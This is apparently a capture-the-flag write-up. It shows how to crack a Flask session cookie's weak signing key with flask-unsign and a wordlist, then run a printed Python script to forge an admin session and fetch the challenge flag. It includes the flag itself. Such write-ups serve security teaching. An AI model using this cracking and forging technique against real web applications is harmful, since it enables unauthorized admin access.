## Challenge Description
A web exploitation challenge involving a Flask application where the goal is to gain administrative access to retrieve a flag.

## Analysis

### Source Code Review
The provided `app.py` reveals the core logic:

```python
def derived_level(sess, secret_key):
    user = sess.get("user", "")
    role = sess.get("role", "")
    if role == "admin" and user == secret_key[::-1]:
        return "superadmin"
    return "user"

@app.route("/admin")
def admin():
    level = derived_level(session, app.secret_key)
    if level == "superadmin":
        return render_template("admin.html", flag=flag_value)
    return "Access denied.\n", 403
```

To get the flag, we need to satisfy two conditions in our session:
1. `role` must be set to `"admin"`.
2. `user` must be the **reverse** of the server's `SECRET_KEY`.

### The Problem
The `SECRET_KEY` is loaded from the environment variables. The local `.env` file provided in the download contained a placeholder (`<fake_secret_key>`), which does not work on the remote server.

There was a misleading string in the EXIF data of `static/cookie.jpg` (`fPCwmvV/0a2Rul8RgRsZdaiP8Pfn1EvJXXrJLvSwmAM=`), but this turned out to be a rabbit hole (or a hash of a key we couldn't easily crack).

## Exploitation

### 1. Obtaining the Secret Key
Since we have a valid session cookie from the server (by visiting the homepage), and the server is likely using a weak secret key, we can attempt to brute-force it using `flask-unsign`.

**Command:**
```bash
flask-unsign --unsign --cookie "<server_cookie>" --wordlist /usr/share/wordlists/rockyou.txt
```

**Result:**
The tool successfully cracks the signature and reveals the secret key: `qwertyuiop`.

### 2. Forging the Admin Cookie
With the secret key (`qwertyuiop`), we can now forge a valid session cookie that satisfies the exploit conditions.

*   **Secret Key:** `qwertyuiop`
*   **Target Role:** `admin`
*   **Target User:** `poiuytrewq` (The secret key reversed)

**Forge Script:**
```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = "qwertyuiop"

session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

session_data = {"user": "poiuytrewq", "role": "admin"}
cookie_val = serializer.dumps(session_data)

print(f"Forged Cookie: {cookie_val}")
```

### 3. Retrieving the Flag
We send the forged cookie to the `/admin` endpoint.

**Command:**
```bash
curl -H "Cookie: session=<forged_cookie>" http://104.198.24.52:6011/admin
```

**Response:**
The server accepts the cookie as valid superadmin credentials and returns the page containing the flag.

## Flag
```
flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}
```
